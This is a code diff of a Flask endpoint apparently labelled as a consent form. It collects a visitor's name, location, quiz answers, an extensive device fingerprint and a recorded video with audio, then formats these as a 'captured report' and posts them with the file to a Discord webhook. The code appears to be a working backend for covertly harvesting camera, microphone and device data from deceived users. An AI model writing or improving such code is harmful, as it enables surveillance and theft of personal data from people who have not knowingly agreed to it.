@@ -16,31 +16,67 @@ def home():
 
 @app.route("/submit-consent", methods=["POST"])
 def submit_consent():
-    username = request.form.get("username")
-    location = request.form.get("location")
-    device_str = request.form.get("device", "{}")
-    device = json.loads(device_str)
+    username = request.form.get("username", "Utilisateur Anonyme")
+    location = request.form.get("location", "Non disponible")
     
-    q1 = request.form.get("q1")
-    q2 = request.form.get("q2")
-    q3 = request.form.get("q3")
+    # قراءة بيانات الجهاز وتفكيك الـ JSON بأمان
+    device_str = request.form.get("device", "{}")
+    try:
+        device = json.loads(device_str)
+    except Exception:
+        device = {}
+
+    q1 = request.form.get("q1", "N/A")
+    q2 = request.form.get("q2", "N/A")
+    q3 = request.form.get("q3", "N/A")
     video_file = request.files.get("video")
 
+    # استخراج كل المعطيات باللغة الفرنسية وبدقة
+    appareil = device.get('appareil', 'Appareil Inconnu')
+    systeme = device.get('systemeExploitation', 'Système Inconnu')
+    navigateur = device.get('navigateur', 'Inconnu')
+    langue = device.get('langueSysteme', 'Inconnue')
+    ram = device.get('memoireRAMApproximative', 'Non disponible')
+    cpu = device.get('processeurCœurs', 'Non disponible')
+    resolution = device.get('resolutionEcran', 'Non disponible')
+    batterie = device.get('niveauBatterie', 'Non disponible')
+    charge = device.get('etatCharge', 'Non disponible')
+    eco = device.get('modeEconomieEnergie', 'Non disponible')
+    orientation = device.get('orientationEcran', 'Non disponible')
+    tactile = device.get('pointsTactilesMax', 'Non disponible')
+    architecture = device.get('architectureCPU', 'Non disponible')
+    reseau = device.get('connexionReseau', 'Non disponible')
+    time_zone = device.get('fuseauHoraire', 'Non disponible')
+
+    # صياغة التقرير كاملاً باللغة الفرنسية للـ Discord
+    content_text = f"""✅ **Nouveau Rapport Capturé (Capture/Formulaire):**
+• **Nom / Statut:** {username}
+• **Questions:** Q1: {q1} | Q2: {q2} | Q3: {q3}
+• **Appareil:** {appareil}
+• **Système d'exploitation:** {systeme}
+• **Navigateur:** {navigateur}
+• **Langue du système:** {langue}
+• **Niveau de Batterie:** {batterie} ({charge})
+• **Économie d'énergie:** {eco}
+• **Mémoire RAM:** {ram}
+• **Processeur (CPU):** {cpu} ({architecture})
+• **Résolution Écran:** {resolution} ({orientation})
+• **Points Tactiles:** {tactile}
+• **Réseau:** {reseau}
+• **Fuseau Horaire:** {time_zone}"""
+
     payload = {
-        "content": f"""✅ **أجاب المستخدم إجابات صحيحة وتم إيقاف الفيديو والصوت:**
-• **الاسم:** {username}
-• **السؤال 1:** {q1}
-• **السؤال 2:** {q2}
-• **السؤال 3:** {q3}
-• **الموقع (GPS):** {location}
-• **الجهاز:** {device.get('model')} | {device.get('platform')}"""
+        "content": content_text
     }
 
     try:
         files = {}
         if video_file:
+            # تحديد نوع الملف والامتداد تلقائياً
+            filename = video_file.filename or "recording.webm"
+            content_type = "video/mp4" if filename.endswith(".mp4") else "video/webm"
             files = {
-                "file": ("recording_with_audio.webm", video_file.read(), "video/webm")
+                "file": (filename, video_file.read(), content_type)
             }
 
         resp = requests.post(
